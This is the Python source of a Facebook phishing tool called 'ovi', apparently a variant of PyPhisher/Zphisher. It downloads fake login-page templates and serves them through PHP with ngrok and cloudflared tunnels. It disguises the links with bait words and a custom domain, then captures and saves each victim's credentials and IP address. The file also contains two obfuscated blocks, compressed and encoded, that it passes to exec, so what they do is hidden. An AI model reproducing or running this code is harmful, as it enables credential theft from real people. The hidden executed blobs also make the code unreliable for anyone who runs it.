# -*- coding: UTF-8 -*-
# ToolName   : ovi
# Author     : ovi
# Version    : 1.7
# Description: ovi is a phishing tool in python
# Tags       : Facebook Phishing
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : Zphisher, MaskPhish

"""
                 


# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.7"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/ovi/banner-generator

logo=f'''
{red}  _____       _____  _     _     _               
{cyan} |  __ \     |  __ \| |   (_)   | |              
{yellow} | |__)
{blue} |  ___/ | | |  ___/
{red} | |   | 
{yellow} |_
{green}         __/ |                          {cyan}[v{version}]
{cyan}        |___/                   {red}[By ovi]
'''


pkgs=[ "php", "curl", "wget", "unzip" ]


try:
    test = popen("cd $HOME && pwd")
except:
    exit()

root = popen("cd $HOME && pwd").read().strip()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

choice_file = "files/templates.json"

# Check termux
if exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False
    
# Check if mac has tunneler binaries
if brew:
    if system("command -v ngrok > /dev/null 2>&1")==0:
        ngrok=True
    else:
        ngrok=False
    if system("command -v cloudflared > /dev/null 2>&1")==0:
        cloudflared=True
    else:
        cloudflared=False
else:
    ngrok=False
    cloudflared=False

print(f"\n{info}Please wait!\n")

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'===OM4IDR77O5VH65XY74H42W4JIRMBKVVUOFA4YKAJ6M6RYMIQQGXV543K6J3MQPON4UO5O62LIZ6B5XB7AGLGVXIPXD2GCYLJB7SUKOO3X7PN35U7ARDLDVKNERLAMXDIIIXFEVSTGTDMT2TLSIHBD7KGOAG6LEZC33JMCMOXYU7Q327XMEWXYFBW4Q3NRXRAH2GMSWUR5HWW3N4IFHDOJF7DKJNDF6BSYSDYQM3BX2IZ6ZPHL4WBTCPQ6ESK7MXYRED7QHJX7OBOPRBVSEWNAMM3LS4AZYS7Y7NSSI4QQ43UH7Y3FVN5VQ5JDRYR2DPZEC72YR65LNLNB5LYQRAEB5BCHWROVMOQWYS66NA335BEZB4PSFDYFXLUKSBUY77LVLIQ4GSOMGNEIRZ6PEP4VZ5PTKIWQZMKJIYG3MUQVVJZQNSTX52LVRVORX2233YSGTXQTSM2PNRHZFY35TEOWCCPYWGYSPUT3MQ6CFHP7FCRMEEORL4S4IF3UGDVRXEQUJ4AY3GHD6AXPLBCDH5RKODLMJ7DP6HTMYRA3XGKMFTCLNNY7FBWGQPDMJRUDJ4DFCUEB34EFNCZ2ZTTFNFKQ3YE2FRTVTBVX5A6F5ULQLNLTLEDEKPIQZRYH57BJLPBSWKA3MQGSK3ECNRU45IZHKWCIRM723IQ632ZQQFUWKEREGUC3FAIK3ZIDAJJ7HZTDE6B56DYZJ7QXC6XJKAKRFZAND5KGCR7DV4W56P36RFF5GCVA6XZXZ22ZCGROM5CUNHOXEH7KYS5NPUVAHOGGKATGG3ZVPVE3JQEALB4FYSNFFXO4MAOPR7EZPODJVTOGBM42SVRI4JY55DBOPM6YROAIMOVYN5CGRY2KBQ5RSMS2DYMQMEFGQU72P6E6SNGSQI3SUQGFJDVD7FFB7K7OWB7WCTC3XNHC5DBLQDHWXMFZRLHWE6NFCSCZX244BFVLYMRP72R3IDQQL3JPZFMAK4QXXVVRHS52H37BYQUT7T3TQYEC63LTX2GU56F2UGPXX3EL3K6KJDMPQUARXBAJ22EOVG5K3IAPCHIQO5KVLYXFVLCTTB53T55XLEY6A7KNMP36VHCL3YN5DKF3HJNAXKSLSTJCWNL4H67SV4GQHAWLDA3I4FCGBO43SRPWOOUO6GAGUDUVLWV7RDWBM4RHKF3YXTZYV5WGIB3FQ2OGZJDI5WBW67GR7WC7GP5ILKXT5T5T3W2OCUF3HUKIIPM7QWKWEYFP6JTNBHYORXRHGUKRFS7OGICIGL2KQW6Q7WWS6LANNUQ5JRXDVISS33OFOWZHXJGWZO4PEG7TJ5LC2VVE4GDK4YKWILZIJIHCRA5DHVAS5LX6YAOBTNRO3AYMOQEFRH3WRARVPCEPEXJ5R5M2FT2B5FM5543H5AYTRIOJFVFTYEH3ZAKP3TFU6JX32IRUQALXFMSPWFDJ37FCGQA2BKBKY4U5SROTIPUQ2NQGE6DG2X5AOJWLXI37FQCR64UZEQDWUGBUM4FGKF4OGSALLXMPX5RHIFGV7B3DEJBRREORRE3LWRTAAIDK3CRSL3PHSQFWHX5NEH4BHOW2PGRQXZQMXQJ4KXKJKIXBFDNHNLCCK5XHABZIKVPJR6JA76KWCS4RXREINZ2WQMZSYDKFVAQ3ANCVR5YI5ZZVXXKZO7FA3F34TK3G4IL2Q3QAKLFFJA5TVNVEKECL63O3XXDB4VTIHWOM6BTM7Y2XV5X6PSJGWB6KQ6CWXQFVYW2S6D3SYCLXVC3QAEEOJYMTRZOWZL3XCCTF3DJBFVASLADFZCJAGLGVRN4SWJ3GMTI745V6NKJR6FJ3W74BEFPJ3Z5CHVGDINUQM3JYJIOUKPPJEEUIHIQ224ORCWG3D5AI6S43B644O4J6Z2G43S7UTFBTGJOQNCMDB5MGZDMG6AGLCIQUAVR4MA4526CKONWVCEESXOQVGJNJLYIN5QHAYQIDSIBROEN5JAAR5NIG3RRZVXK4GWH6T6BVFHZH7S6QQ25NYGF7MI3QHTX3M53FJ7L23ENDL5CXFZXO45T757763P6ZP643P77P7J7PO43MCEQACIABDO4R43BYQMMELCD3ENC3LBKZ25SXXR5RFCEMDM3BHKFLBOCP'))




# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Install packages in Termux and Mac
def installer(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"{pm} install -y {pkgs[pkg]}")

# Install packages in Linux
def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"sudo {pm} install -y {pkgs[pkg]}")



# Process killer
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof ngrok > /dev/null 2>&1")==0:
        system("killall ngrok")
    if system("pidof cloudflared > /dev/null 2>&1")==0:
        system("killall cloudflared")
    if system("pidof curl > /dev/null 2>&1")==0:
        system("killall curl")
    if system("pidof wget > /dev/null 2>&1")==0:
        system("killall wget")
    if system("pidof unzip > /dev/null 2>&1")==0:
        system("killall unzip")



# Website chooser
def show_options(sites):
    leng=len(sites)
    i=0
    j=int(leng/3)
    k=int((2*leng)/3)
    if leng%3!=0:
        j+=1
        k+=1
    m=j
    while i<m:
        print(f"{green}[{white}{str(i+1)}{green}] {yellow}{sites[i]}", end="")
        lew=len(sites[i])
        sp=22-lew
        if i<9:
            sp=sp+1
        for s in range(sp):
            print(" ",end="")
        print(f"{green}[{white}{str(j+1)}{green}] {yellow}{sites[j]}", end="")
        lew=len(sites[j])
        sp=16-lew
        for s in range(sp):
            print(" ",end="")
        if k<leng:
            print(f"{green}[{white}{str(k+1)}{green}] {yellow}{sites[k]}", end="")
        i+=1
        j+=1
        k+=1
        print()
    print()
    print(f"{green}[{white}x{green}]{yellow} About                  {green}[{white}m{green}]{yellow} More tools       {green}[{white}0{green}]{yellow} Exit")
    print()
    print()


# Info about tool
def about():
    system("clear")
    sprint(logo, 0.01)
    print(f"{red}[ToolName]  {cyan} :[ovi] ")
    print(f"{red}[Version]   {cyan} :[{version}] ")
    print(f"{red}[Author]    {cyan} :[ovi] ")
    print(f"{red}[Github]    {cyan} :[https://github.com/ovigithubbd] ")
    print(f"{red}[Messenger] {cyan} :[https://m.me/saif.dewan.20] ")
    print(f"{red}[Email]     {cyan} :[ovisamirulalam@gmail.com] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    abot= input("\n > ")
    if abot== "0":
        pexit()
    else:
        main()
        

# Copy website files from custom location
def customfol():
    fol=input(f"\n{ask}Enter the directory > {green}")
    mask=input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
    mask = "https://" + sub("(/| )", "-", mask)
    if exists(fol):
        if isfile(f"{fol}/index.php"):
            system(f'cd "{fol}" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site')
            server(mask)
        else:
            sprint(f"{error}Index.php required but not found!")
            main()
    else:
        sprint(f"{error}Directory do not exists!")
        main()


# Update of PyPhisher
def updater():
    internet()
    git_ver=popen("curl -s -N https://raw.githubusercontent.com/ovi/PyPhisher/main/files/version.txt").read().strip()
    if (version != git_ver and git_ver != "404: Not Found"):
        changelog=popen("curl -s -N https://raw.githubusercontent.com/ovi/PyPhisher/main/files/changelog.log").read()
        system("clear")
        print(logo)
        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update PyPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/ovi/PyPhisher")
            sprint(f"\n{success}PyPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# First function main
_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'=Q+k1j3H93f+8X18MWkodnhC4CuINoepNqFnKAi1wlCjIpSpF71tPX8aX4sitxWokQi0G2DiLBGMUKXBkKbIwrY9ZK2oTVksFAJrsT/YVGWwf5uzmelUzNA+BNbeZOP8uLV3R/1ZFYdTciaNJEexaK7VhaODvPbfHJFFPLNDZdoU5lRUwhOkUxeg0kWQjscUoBY0d3opMpco2kK1Rgl9MINYun27HYr+M5kHGQ41jlABaR9JTFVwEEWrA5d1NzPZPMO9GUzx3slK8YFLiU96IWyLv3epevNDjGmVVmRT7D0Hwk9NkzmIItLrm+eKt/hApuuLr9ZfF6xmyqy4LAlqdxoytPdpHT91OXvTVgdQ5cQQABJ2oKTy6wvNi9U6siruJMp3CTiud7GY7Gvhdt+qQV7ohoiUSRsUNdU50306A968YRz7yHUufhbOIRDD6WydhzeBPC8UhEjy8ROSUg+5d0CErK8rLE6vl9xMamDS0ZrCMum56sfqiJ/ZcYOHtwaQbNmFPxNF2UiGS8jufGzVsD8bFuXrtiCDmB8q3DEHYrWA81nU2yuS48ork5iYu+aizGT6OfUryIfeVP9Mz4Yqg2BWZD5QeJiBoMJBVDE7XesCVioNmvSjvtFS26LeW4R9c2+lL3dkW/FCTng35ttNxfaETTch8yTvEqewiuQLzOxMDpLofnn1TUWPEIGW9b8sRQsYAmPLTSlHFFsUC+ZMRNHLO3JPilTpcp7+p7fB3BYXuN4+9kE+6XS2yFRVe7hhLZp8MTzlC7UXQvtKVOJEAzEjRn+EqwecsOZDFHY/KUOFLdaPLEW7FCU6AzYbIFFAi7u5IhVRq6YsqCV34HdXFBpyrDkDq8fLZ8wj5zf+XmAL8HQp+lWyjQqjOMOYpg/Zj6NJjlunopdZ/lNmdZNPKZe7IBd+2pug0JSgnEa8lmnWBUshrG2Uje4hHDhctlBxRp7W5MEHuS2gX3XSCzw5vQmVd2WrEY7xVZbbN676/BGwtSFSVKgPdmIcbCVfXlXG1NBpIQKHqc0N+0TbHJXk/IiTKd5NDbkg8WFOYew5+wNwaZr43gPiKMpEENIweAaGQGdNV6eUtqw0ibCcu5xh1lmj5+xjXY3Gk3Rqqc0uz9oZ+NKTAp/FLbT+BHWKHRAQKL+p4ArFyhdPMtB/7PhsWs0Q4vnSXxXd4jcH0nxQbzrHA3GhHnAeA/8N1fEPe+/f/I9f+9/nfKrKijMjF23PP1lwwbSbFGu6oA3LFdrAB/P9jDMAAgFpyW00NwJe'))

# 2nd function installing packages and downloading tunnelers
def prerequiments():
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing proot{nc}")
            system("pkg install proot -y")
        installer("pkg")
    else:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
                    sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
                    system(f"sudo pacman -S {pkgs[pkg]} --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            sprint(f"\n{error}Unsupported package manager. Install packages manually!{nc}")
            exit(1)
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(f"{error}PHP cannot be installed. Install it manually!{nc}")
        exit(1)
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(f"{error}Unzip cannot be installed. Install it manually!{nc}")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(f"{error}Curl cannot be installed. Install it manually!{nc}")
        exit(1)
    killer()
    architecture=popen("uname -m").read()
    platform=popen("uname").read()
    if not exists(f"{root}/.ngrokfolder"):
        system("mkdir $HOME/.ngrokfolder")
    if not exists(f"{root}/.cffolder"):
        system("mkdir $HOME/.cffolder")
    if not isfile(f"{root}/.ngrokfolder/ngrok") or (brew and not ngrok):
        sprint(f"\n{info}Downloading ngrok.....{nc}")
        internet()
        system("rm -rf ngrok.zip ngrok.tgz")
        if platform.find("Linux")!=-1:
            if architecture.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/ovi/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
                system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
            elif architecture.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/ovi/files/raw/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1 ")
            elif architecture.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/ovi/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
            else:
                system("wget -q --show-progress https://github.com/ovi/files/raw/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
                system("unzip ngrok.zip > /dev/null 2>&1")
        elif platform.find("Darwin")!=-1:
            if architecture.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/ovi/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
                system("unzip ngrok.zip > /dev/null 2>&1")
            elif architecture.find("arm64")!=-1:
                system("wget -q --show-progress 'https://github.com/ovi/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
            else:
                print(f"{error}Device architecture unknown. Download ngrok manually!")
                system("brew install ngrok/ngrok/ngrok")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("rm -rf ngrok.zip")
        system("mv -f ngrok $HOME/.ngrokfolder")
        if sudo:
            system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
        else:
            system("chmod +x $HOME/.ngrokfolder/ngrok")
    if not isfile(f"{root}/.cffolder/cloudflared") or (brew and not cloudflared):
        sprint(f"\n{info}Downloading cloudflared.....{nc}")
        internet()
        system("rm -rf cloudflared cloudflared.tgz")
        if platform.find("Linux")!=-1:
            if architecture.find("aarch64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
            elif architecture.find("arm")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
            elif architecture.find("x86_64")!=-1:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
            else:
                system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
        elif platform.find("Darwin")!=-1:
            if architecture.find("x86_64")!=-1:
                system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
                system("tar -zxf cloudflared.tgz > /dev/null 2>&1")
            else:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
                system("brew install cloudflare/cloudflare/cloudflared")
                sleep(3)
        else:
            print(f"{error}Device not supported!")
            exit(1)
        system("rm -rf cloudflared.tgz")
        system("mv -f cloudflared $HOME/.cffolder")
        if sudo:
            system("sudo chmod +x $HOME/.cffolder/cloudflared")
        else:
            system("chmod +x $HOME/.cffolder/cloudflared")
    if system("pidof php > /dev/null 2>&1")==0:
        sprint(f"{error}Previous php still running! Please restart terminal and try again{nc}")
        pexit()
    if system("pidof ngrok > /dev/null 2>&1")==0:
        sprint(f"{error}Previous ngrok still running. Please restart terminal and try again{nc}")
        pexit()
    system("rm -rf $HOME/.site && cd $HOME && mkdir .site")


# 3rd function checking requirements and download files 
def requirements(folder, mask):
    if isfile(f"{root}/.websites/version.txt"):
        with open(f"{root}/.websites/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if zipver!=version:
                sprint(f"\n{info}Downloading required files.....\n")
                system("wget -q --show-progress https://github.com/ovi/files/raw/main/websites.zip -O websites.zip")
    else:
        sprint(f"\n{info}Downloading required files.....\n")
        system("wget -q --show-progress https://github.com/ovi/files/raw/main/websites.zip -O websites.zip")
    if isfile("websites.zip"):
        system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
        system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
        remove("websites.zip")
    if exists(f"{root}/.websites/{folder}"):
        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    else:
        internet()
        sprint(f"\n{info}Downloading required files.....\n")
        system("rm -rf site.zip")
        system(f"wget -q --show-progress https://github.com/ovi/files/raw/main/phishingsites/{folder}.zip -O site.zip")
        if not exists(f"{root}/.websites/{folder}"):
            system(f"cd $HOME/.websites && mkdir {folder}")
        system(f"unzip site.zip -d $HOME/.websites/{folder}")
        remove("site.zip")
        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    server(mask)

# Start server and tunneling
def server(mask):
    system("clear")
    sprint(logo, 0.01)
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(1)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    internet()
    system(f"cd $HOME/.site && php -S {local_url} > /dev/null 2>&1 &")
    sleep(2)
    if not system(f"curl --output /dev/null --silent --head --fail {local_url}"):
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    system("rm -rf $HOME/.cffolder/log.txt")
    if system("command -v termux-chroot > /dev/null 2>&1")==0:
        system(f"cd $HOME/.ngrokfolder && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    elif brew and ngrok and cloudflared:
        system(f"cd $HOME/.ngrokfolder && ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    else:
        system(f"cd $HOME/.ngrokfolder && ./ngrok http {local_url} > /dev/null 2>&1 &")
        system(f"cd $HOME/.cffolder && ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    sleep(9)
    ngrok_link=popen("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io'").read()
    if ngrok_link.find("ngrok")!=-1:
        ngrok_check=True
    else:
        ngrok_check=False
    if isfile(f"{root}/.cffolder/log.txt"):
        cf_link=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
    else:
        cf_link=""
        sprint(f"\n{error}Cloudflared failed to start!{nc}")
    if cf_link.find("cloudflare")!=-1:
        cf_check=True
    else:
        cf_check=False
    if ngrok_check and cf_check:
        url_manager(cf_link, mask, "1", "2")
        url_manager(ngrok_link, mask, "3", "4")
        cuask(cf_link)
    elif not ngrok_check and cf_check:
        url_manager(cf_link, mask,  "1", "2")
        cuask(cf_link)
    elif not cf_check and ngrok_check:
        url_manager(ngrok_link, mask, "1", "2")
        cuask(ngrok_link)
    elif not (cf_check and ngrok_check):
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        waiter()
    else:
        sprint(f"\n{error}Unknown error!")
        pexit()


# Output urls
def url_manager(url, mask, num1, num2):
    sprint(f"\n{success}Your urls are given below:")
    print(f"\n{info2}URL {num1} > {yellow}{url}")
    print(f"{info2}URL {num2} > {yellow}{mask}@{url.replace('https://','')}")


# Ask to mask url
def cuask(url):
    cust= input(f"\n{ask}{bcyan}Wanna try custom link?(y or press enter to skip) > ")
    if not cust=="":
        masking(url)
    waiter()

# Optional function for ngrok url masking
def masking(url):
    website= "https://is.gd/create.php\?format\=simple\&url\="+url.strip()
    internet()
    resp= popen(f"curl -s {website} | head -n1").read()
    if not resp.find("https://")!=-1:
        sprint(f"{error}Service not available!\n{resp}")
        waiter()
    short= resp.replace("https://", "")
    domain= input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain=="":
        sprint(f"\n{error}No domain!")
    else:
        domain = sub("(/| )", ".", sub("https?://", "", domain))
        domain= "https://"+domain+"-"
    bait= input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("(/| )", "-", bait)+"@"
    final= domain+bait+short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")
    waiter()

# Last function capturing credentials
def waiter():
    system("rm -rf $HOME/.site/ip.txt")
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(f"{root}/.site/usernames.txt"):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                with open(f"{root}/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    useri=0
                    userlen=len(userdata)
                    while useri<userlen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{userdata[useri]}",end="")
                        useri+=1
                print(f"\n{info}Saved in usernames.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                remove(f"{root}/.site/usernames.txt")
            sleep(0.75)
            if isfile(f"{root}/.site/ip.txt"):
                print(logo)
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                with open(f"{root}/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    ipi=0
                    iplen=len(ipdata)
                    while ipi<iplen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{ipdata[ipi]}",end="")
                        ipi+=1
                print(f"\n{info}Saved in ip.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        system("stty -echoctl") # Skip printing ^C
        if update:
            updater()
        main()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
